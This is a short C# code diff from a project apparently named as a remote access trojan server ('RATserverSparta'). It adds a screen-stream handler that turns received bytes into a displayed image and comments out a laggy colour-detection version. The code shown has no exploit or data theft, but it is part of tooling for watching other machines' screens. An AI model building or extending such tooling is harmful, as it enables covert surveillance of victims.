@@ -1,4 +1,4 @@
-﻿using RATserverSparta.Client;
+using RATserverSparta.Client;
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -112,6 +112,26 @@ namespace RATserverSparta.Tools.Screen
         {
             this.Invoke((MethodInvoker)delegate
             {
+                try
+                {
+                    MemoryStream imageStream = new MemoryStream(buffer);
+                    Image receivedImage = Image.FromStream(imageStream);
+                    pictureBox1.Image = receivedImage;
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("Error: " + ex.Message);
+                }
+            });
+        }
+
+        /* Color detector feature - right now causing alot lags at the screen stream
+         * 
+         * 
+         * void screenStream(byte[] buffer)
+        {
+            this.Invoke((MethodInvoker)delegate
+            {
                 char biggerValue(int[] rgb)
                 {
                     if (rgb[0] > rgb[1] && rgb[0] > rgb[2])
@@ -164,7 +184,7 @@ namespace RATserverSparta.Tools.Screen
                     Console.WriteLine("Error: " + ex.Message);
                 }
             });
-        }
+        }*/
 
 
 
